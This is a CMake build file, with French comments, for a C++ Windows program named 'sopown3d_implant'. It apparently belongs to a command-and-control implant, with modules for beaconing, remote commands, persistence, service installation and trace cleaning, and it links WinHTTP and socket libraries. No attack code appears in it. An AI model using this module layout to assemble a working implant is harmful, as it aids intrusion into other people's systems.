cmake_minimum_required(VERSION 3.10)
project(sopown3d_implant LANGUAGES CXX)

# Le code utilise std::string::data() en lecture/ecriture : C++17 obligatoire.
set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)

add_executable(sopown3d_implant
    src/main.cpp
    src/network.cpp
    src/beacon.cpp
    src/commands.cpp
    src/commands_file.cpp
    src/commands_system.cpp
    src/error.cpp
    src/persistence.cpp
    src/cleaner.cpp
    src/service.cpp
    src/log.cpp  
)

# Les headers sont dans include/ (portee limitee a cette cible).
target_include_directories(sopown3d_implant PRIVATE include)

# WinHTTP pour le canal, IPHLPAPI pour ipconfig, WS2_32 pour les sockets.
target_link_libraries(sopown3d_implant PRIVATE
    winhttp
    ws2_32
    iphlpapi
)